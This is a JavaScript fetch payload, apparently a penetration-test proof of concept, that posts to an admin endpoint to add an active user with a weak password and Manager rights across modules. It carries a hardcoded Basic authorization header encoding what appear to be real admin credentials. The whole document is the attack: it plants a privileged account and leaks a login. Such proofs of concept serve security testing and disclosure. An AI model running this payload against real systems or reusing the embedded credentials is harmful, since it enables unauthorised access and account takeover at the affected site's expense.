fetch('/admin/ajax-user-update', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded',
    'Authorization': 'Basic b25lc2hpZnQ6S28jMGY5QGdvbDBLUzY3bQ=='
  },
  body: 'mode=add&uid=0&active=1&name=test&mobile=98989897&email=prashant.gupta@appsecure.security&password=123456&user_mgt=Manager&telesales=Manager&purchaser=Manager&direct_sales=Manager&consignment_cst=Manager&assignable=0&c2b_rr=1'
});
